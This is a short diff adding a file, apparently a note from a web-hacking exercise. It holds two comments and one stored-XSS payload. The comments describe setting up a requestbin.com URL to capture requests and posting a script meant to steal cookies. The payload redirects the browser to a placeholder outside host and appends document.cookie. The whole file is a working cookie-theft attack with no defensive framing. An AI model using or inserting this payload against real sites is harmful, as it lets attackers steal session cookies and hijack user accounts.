@@ -1,0 +1,3 @@
+# create temporary url in http://requestbin.com to capture url request
+# submit post with xss to get the cookie
+<script>document.location = "http://[url]?cookie=" + document.cookie</script>
